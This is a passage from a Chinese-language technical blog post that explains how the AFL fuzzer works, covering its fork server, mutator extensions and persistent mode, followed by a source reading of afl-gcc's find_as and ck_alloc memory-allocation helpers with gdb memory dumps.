server，然后fuzzer通过管道发送4字节数据通知fork server去fork一个进程来测试。</li><li>无论被fuzz的进程结果如何，fork server都会通过管道返回子进程的执行结果到afl-fuzz</li><li>afl-fuzz根据测试生成的覆盖率信息来引导后续的测试</li></ol><blockquote><p>进程关系：fuzzer进程 -&gt; fork server -&gt; 被fuzz的程序</p></blockquote><p>常用的AFL魔改技巧有哪些？</p><ul><li>因为AFL中有覆盖率反馈和crash捕获的功能，所以可以替换AFL原本的mutate【变异器】为自己的代码，说白了就是借了AFL的一个壳。</li><li>在写入testcase之前可以对写入的内容进行封装和映射，afl-fuzz的这部分原本的代码如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write modified data to file for testing. If out_file is set, the old file</span></span><br><span class="line"><span class="comment">   is unlinked and a new one is created. Otherwise, out_fd is rewound and</span></span><br><span class="line"><span class="comment">   truncated. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">write_to_testcase</span><span class="params">(<span class="type">void</span>* mem, u32 len)</span> &#123;</span><br><span class="line"></span><br><span class="line">  s32 fd = out_fd;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line"></span><br><span class="line">    unlink(out_file); <span class="comment">/* Ignore errors. */</span></span><br><span class="line"></span><br><span class="line">    fd = open(out_file, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, out_file);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">  ck_write(fd, mem, len, out_file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!out_file) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ftruncate(fd, len)) PFATAL(<span class="string">&quot;ftruncate() failed&quot;</span>);</span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> close(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>write_to_testcase</code>函数会将变异生成的新样本写入到<code>.cur_input</code>隐藏文件夹中，所以我们在文件写入之前可以在外面套上一层函数以便让AFL的原始字节码的变异适用于更多的场景。afl-fuzz适合基于字节粒度变异的fuzz（如fuzz一个简单的输入输出程序），但并不是所有目标都可以直接进行字节粒度的fuzz。有些是因为文件解析部分的代码不能单独抽出来，有些是因为文件解析仅仅是逻辑的开始。那么为变异器加层就是在这方面扩展afl-fuzz的最简单方法，最经典的例子如<code>webassembly</code>。</p><p>为了fuzz这些结构化的东西（类似SQL）我们需要进行<code>结构感知（structure-aware）</code>，即针对特定输入类型的语法进行感知</p><p><strong>如何使用AFL fuzz client-server模式的程序，或者如何使用AFL去fuzz网络协议呢？</strong></p><p>lient-server模式中的client -&gt; server大致流程如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">client ---&gt; server()&#123;</span><br><span class="line">    接收包();</span><br><span class="line">    处理包();</span><br><span class="line">    返回响应包();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这篇文章值得参考：<a href="https://www.fastly.com/blog/how-fuzz-server-american-fuzzy-lop">https://www.fastly.com/blog/how-fuzz-server-american-fuzzy-lop</a></p><p>文章中提到一个为<code>Persistent mode（持久模式）</code>的概念，如果要向AFL集成这种功能，我们可以按照如下流程编写自己的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (go)<span class="comment">//while loop</span></span><br><span class="line">    put_request(read(file)) <span class="comment">//将client要发送的请求包写入到文件中</span></span><br><span class="line">    req = get_request()<span class="comment">//并让服务端从文件中获取请求</span></span><br><span class="line">    process(req)<span class="comment">//服务端处理请求</span></span><br><span class="line">    notify_fuzzer() <span class="comment">//通知fuzzer（AFL）</span></span><br></pre></td></tr></table></figure><p>该方法需要用afl直接启动server程序，patch server程序接收请求包的代码，改为直接从标准输入里读取，server执行足够多次请求后退出，AFL再启动一个新的server再次fuzz。</p><p><strong>fuzz要真正解决的问题和一些Sakura师傅的建议</strong></p><ul><li>要对某一个项目进行fuzz就要首先考虑如何将项目跑起来，如何在插桩和asan之后跑起来。所以要先学会Makefile和CMake，必要时要学会使用unicorn、qiling等固件仿真工具进行模拟运行。</li></ul><blockquote><p>Address Sanitizer又名ASan，是一个快速的C&#x2F;C++内存错误检查器。它可以检测到：UAF、Heap buffer overflow、Stack buffer overflow、Global buffer overflow、Use after return、Use after scpoe、Initialization order bugs、Memory leak等漏洞类型。asan可以简单理解成对malloc和free以及存取指令等的hook，从而在发现分配出来的内存的大小，小于要存取的index的大小时，检测出越界读写问题。</p></blockquote><ul><li><p>要理解被测试程序的代码，并不是说随便拿到一个程序拿fuzz跑起来是有意义的，例如传入数据的parser（解析器、语法分析器），必要时通过逆向来单独取出一部分代码来测试功能。比如Windows的media player，这是一个图形化的应用程序，我们不能通过命令行窗口来对该程序进行流程的控制与输入，但是这些功能的实现肯定都是存在于某一个dll（动态链接库）中的，所以可以利用dlopen函数写harness来加载dll：</p><blockquote><p>harness作用：如果我们想fuzz dll (加载的库)中的函数输入，因为没有定义入口点，我们需要编写测试工具来将输入从命令行传递到 DLL 函数。</p></blockquote></li><li><p>善于根据场景改进fuzz，以将只用与文件格式fuzz的AFL利用加层或映射让其扩展到更多的场景中，实现自己的自定义编译。</p></li><li><p>根据不同的目标掌握不同的知识，找到主流使用的fuzzer并进行改进</p><ul><li>js fuzz需要掌握编译原理，理解文法</li><li>内核fuzz需要掌握内核知识和驱动盒编写，理解如何构建和生成有关联性的系统调用集合。</li></ul></li><li><p>自定义检测工具</p></li></ul><blockquote><p>Address Sanitizer又名ASan，是一个快速的C&#x2F;C++内存错误检查器。它可以检测到：UAF、Heap buffer overflow、Stack buffer overflow、Global buffer overflow、Use after return、Use after scpoe、Initialization order bugs、Memory leak等漏洞类型。asan可以简单理解成对malloc和free以及存取指令等的hook，从而在发现分配出来的内存的大小，小于要存取的index的大小时，检测出越界读写问题。</p></blockquote><p>asan是对malloc、free等指令的hook，但是如果像js引擎这种直接mmap一块大内存然后自己来管理内存的情况，那么如何检测出潜在的越界读写问题呢？这种时候就需要理解代码，然后自己实现一套针对性的自定义asan了。</p><h2 id="afl-gcc源码阅读"><a href="#afl-gcc源码阅读" class="headerlink" title="afl-gcc源码阅读"></a>afl-gcc源码阅读</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123; <span class="comment">//检查stderr是否连接/dev/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">find_as</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">execvp</span>(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find_as</span>(argv[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>调用find_as命令，argv[0]是afl-gcc的路径</p><h3 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Try to find our &quot;fake&quot; GNU assembler in AFL_PATH or at the location derived</span></span><br><span class="line"><span class="comment">   from argv[0]. If that fails, abort. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">find_as</span><span class="params">(u8* argv0)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 *afl_path = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PATH&quot;</span>);</span><br><span class="line">  u8 *slash, *tmp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/as&quot;</span>, afl_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = afl_path;</span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (slash) &#123;</span><br><span class="line"></span><br><span class="line">    u8 *dir;</span><br><span class="line"></span><br><span class="line">    *slash = <span class="number">0</span>;</span><br><span class="line">    dir = <span class="built_in">ck_strdup</span>(argv0);</span><br><span class="line">    *slash = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-as&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = dir;</span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">    <span class="built_in">ck_free</span>(dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;</span><br><span class="line">    as_path = AFL_PATH;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">u8 *afl_path = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PATH&quot;</span>);</span><br><span class="line">u8 *slash, *tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line"></span><br><span class="line">  tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/as&quot;</span>, afl_path); <span class="comment">//@@@@</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">    as_path = afl_path;</span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(tmp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> alloc_printf(_str...) (&#123; \</span></span><br><span class="line"><span class="meta">    u8* _tmp; \</span></span><br><span class="line"><span class="meta">    s32 _len = snprintf(NULL, 0, _str); \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (_len &lt; 0) FATAL(<span class="string">&quot;Whoa, snprintf() fails?!&quot;</span>); \</span></span><br><span class="line"><span class="meta">    _tmp = ck_alloc(_len + 1); \</span></span><br><span class="line"><span class="meta">    snprintf((char*)_tmp, _len + 1, _str); \</span></span><br><span class="line"><span class="meta">    _tmp; \</span></span><br><span class="line"><span class="meta">  &#125;)</span></span><br></pre></td></tr></table></figure><p>这个宏定义实现了一个动态内存分配的格式化字符串函数，类似于 sprintf，但它会自动分配足够的内存来存储格式化后的字符串，其中调用ck_alloc函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEBUG_BUILD</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* In non-debug mode, we just do straightforward aliasing of the above functions</span></span><br><span class="line"><span class="comment">   to user-visible names such as ck_alloc(). */</span></span><br><span class="line"><span class="comment">/* 在非调试模式下，我们只需将上述函数直接别名为用户可见的名称，例如 ck_alloc() */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_alloc          DFL_ck_alloc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_alloc_nozero   DFL_ck_alloc_nozero</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_realloc        DFL_ck_realloc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_realloc_block  DFL_ck_realloc_block</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_strdup         DFL_ck_strdup</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_memdup         DFL_ck_memdup</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_memdup_str     DFL_ck_memdup_str</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_free           DFL_ck_free</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> alloc_report()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br></pre></td></tr></table></figure><p>此处要求DEBUG_BUILD为假</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ck_alloc(_p1) \</span></span><br><span class="line"><span class="meta">  TRK_ck_alloc(_p1, __FILE__, __FUNCTION__, __LINE__)</span></span><br></pre></td></tr></table></figure><p>接下来还有这个定义</p><p>因此得到：</p><p>非调试模式下的执行流程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ck_alloc</span>(size) </span><br><span class="line">  → <span class="built_in">DFL_ck_alloc</span>(size)</span><br><span class="line">    → <span class="built_in">DFL_ck_alloc_nozero</span>(size)  <span class="comment">// 实际分配</span></span><br><span class="line">    → <span class="built_in">memset</span>(mem, <span class="number">0</span>, size)       <span class="comment">// 清零</span></span><br><span class="line">    → 返回内存指针</span><br></pre></td></tr></table></figure><p>调试模式下的执行流程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ck_alloc</span>(size) </span><br><span class="line">  → <span class="built_in">TRK_ck_alloc</span>(size, __FILE__, __FUNCTION__, __LINE__)</span><br><span class="line">    → <span class="built_in">DFL_ck_alloc</span>(size)         <span class="comment">// 实际分配</span></span><br><span class="line">    → <span class="built_in">TRK_alloc_buf</span>(ret, file, func, line)  <span class="comment">// 记录分配信息</span></span><br><span class="line">    → 返回内存指针</span><br></pre></td></tr></table></figure><p>主要看DFL_ck_alloc函数</p><h4 id="DFL-ck-alloc"><a href="#DFL-ck-alloc" class="headerlink" title="DFL_ck_alloc"></a>DFL_ck_alloc</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Allocate a buffer, returning zeroed memory. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span>* <span class="title">DFL_ck_alloc</span><span class="params">(u32 size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* mem;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!size) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  mem = <span class="built_in">DFL_ck_alloc_nozero</span>(size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(mem, <span class="number">0</span>, size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="DFL-ck-alloc-nozero"><a href="#DFL-ck-alloc-nozero" class="headerlink" title="DFL_ck_alloc_nozero"></a>DFL_ck_alloc_nozero</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span>* <span class="title">DFL_ck_alloc_nozero</span><span class="params">(u32 size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* ret;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!size) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ALLOC_CHECK_SIZE</span>(size);</span><br><span class="line">  ret = <span class="built_in">malloc</span>(size + ALLOC_OFF_TOTAL);</span><br><span class="line">  <span class="built_in">ALLOC_CHECK_RESULT</span>(ret, size);</span><br><span class="line"></span><br><span class="line">  ret += ALLOC_OFF_HEAD;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ALLOC_C1</span>(ret) = ALLOC_MAGIC_C1;</span><br><span class="line">  <span class="built_in">ALLOC_S</span>(ret)  = size;</span><br><span class="line">  <span class="built_in">ALLOC_C2</span>(ret) = ALLOC_MAGIC_C2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">---------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">/* Magic tokens used to mark used / freed chunks. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_MAGIC_C1  0xFF00FF00 <span class="comment">/* Used head (dword)  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_MAGIC_F   0xFE00FE00 <span class="comment">/* Freed head (dword) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_MAGIC_C2  0xF0       <span class="comment">/* Used tail (byte)   */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Positions of guard tokens in relation to the user-visible pointer. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_C1(_ptr)  (((u32*)(_ptr))[-2])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_S(_ptr)   (((u32*)(_ptr))[-1])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_C2(_ptr)  (((u8*)(_ptr))[ALLOC_S(_ptr)])</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">((u32*)(_ptr))[<span class="number">-2</span>] = <span class="number">0xFF00FF00</span> ;</span><br><span class="line">((u32*)(_ptr))[<span class="number">-1</span>] = size ; <span class="comment">// size -&gt;【字符串长度】</span></span><br><span class="line">((u8*)(_ptr))[((u32*)(_ptr))[<span class="number">-1</span>]] =  <span class="number">0xF0</span> ;</span><br></pre></td></tr></table></figure><p>在对应位置写了magic token以及size：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 执行前------------------------------------------------------------------------</span></span><br><span class="line">(gdb) x/<span class="number">16</span>gx ret<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555758270</span>:<span class="number">0xf0006e69622f6c61</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555758280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">                                    <span class="meta"># ret</span></span><br><span class="line"><span class="number">0x555555758290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557582a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020d61</span></span><br><span class="line"><span class="comment">// 执行后------------------------------------------------------------------------</span></span><br><span class="line">(gdb) x/<span class="number">16</span>gx ret<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555758270</span>:<span class="number">0xf0006e69622f6c61</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555758280</span>:<span class="number">0x00000016ff00ff00</span><span class="number">0x0000000000000000</span></span><br><span class="line">                # 【<span class="number">2</span>】、【<span class="number">1</span>】        <span class="meta"># ret</span></span><br><span class="line"><span class="number">0x555555758290</span>:<span class="number">0x0000000000000000</span><span class="number">0x00f0000000000000</span></span><br><span class="line">                                    # 【<span class="number">3</span>】</span><br><span class="line"><span class="number">0x5555557582a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020d61</span></span><br></pre></td></tr></table></figure><p><code>DFL_ck_alloc_nozero</code>函数返回后会调用memset将堆内存清零，说白了<code>DFL_ck_alloc</code>就是外面包了一个<code>memset</code>得到了<code>DFL_ck_alloc_nozero</code></p><h4 id="TRK-ck-alloc"><a href="#TRK-ck-alloc" class="headerlink" title="TRK_ck_alloc"></a>TRK_ck_alloc</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Simple wrappers for non-debugging functions: */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span>* <span class="title">TRK_ck_alloc</span><span class="params">(u32 size, 